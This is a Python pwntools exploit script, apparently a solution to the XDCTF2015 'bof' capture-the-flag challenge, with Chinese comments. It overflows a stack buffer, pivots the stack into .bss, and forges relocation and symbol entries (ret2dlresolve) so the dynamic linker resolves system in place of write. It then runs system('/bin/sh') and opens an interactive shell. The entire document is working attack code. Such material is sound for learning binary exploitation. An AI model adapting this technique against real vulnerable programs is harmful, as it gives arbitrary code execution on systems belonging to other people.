from pwn import *

p = process('./bof')
elf = ELF('./bof')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def debug():
    gdb.attach(p)
    # gdb.attach(p,"b *$rebase(0xDB4C)\nb *$rebase()")
    # pause()

offset = 112

read_plt = elf.plt['read']

ppp_ret = 0x08048619
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458

stack_size = 0x800
bss_addr = 0x804a040#readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

p.recvuntil(b"Welcome to XDCTF2015~!\n")

payload = flat(
    'a' * offset,
    read_plt,
    ppp_ret,
    0,
    base_stage,
    100,
    pop_ebp_ret,
    base_stage,
    leave_ret,
)

p.sendline(payload)

plt_0 = 0x8048380# objdump -d -j .plt bof
rel_plt = 0x8048330#objdump -s -j .rel.plt bof
fake_write_addr = base_stage + 28
fake_arg = fake_write_addr - rel_plt#reloc_arg = Elf32_Rel - .rel.plt

r_offset = elf.got['write']# 对应wirte，由 readelf -r bof 查询,也可以是elf.got['write']

dynsym = 0x080481d8 # readelf -S bof

write_strtab = 0x80482c4
strtab = 0x8048278
st_name = write_strtab - strtab

align = 0x10 - ((base_stage + 36 - dynsym) % 16)
fake_sym_addr = base_stage + 36 + align
r_info = (((fake_sym_addr - dynsym) // 16) << 8) | 0x7 #使最低位为7，通过检测
fake_write = flat(r_offset, r_info)
fake_write_str_addr = base_stage + 36 + align + 0x10
fake_name = fake_write_str_addr - strtab
fake_write_str = 'system\x00'#修改函数名字
fake_sym = flat(fake_name, 0, 0, 0x12)



cmd = '/bin/sh'

payload = flat(
    'aaaa',
    plt_0,# push link_map;jmp dl_runtime_resolve
    fake_arg,#手动push的reloc_arg
    'aaaa',
    base_stage+80,#修改第一个参数为/bin/sh
    base_stage+80,
    len(cmd),#28
    fake_write,#base_stage+28
    'a'*align,#base_stage+36
    fake_sym,
    fake_write_str#伪造的字符串
)
payload += flat('a' * (80-len(payload)), cmd + '\x00')
payload += flat('a' * (100-len(payload)))
p.sendline(payload)

p.interactive()
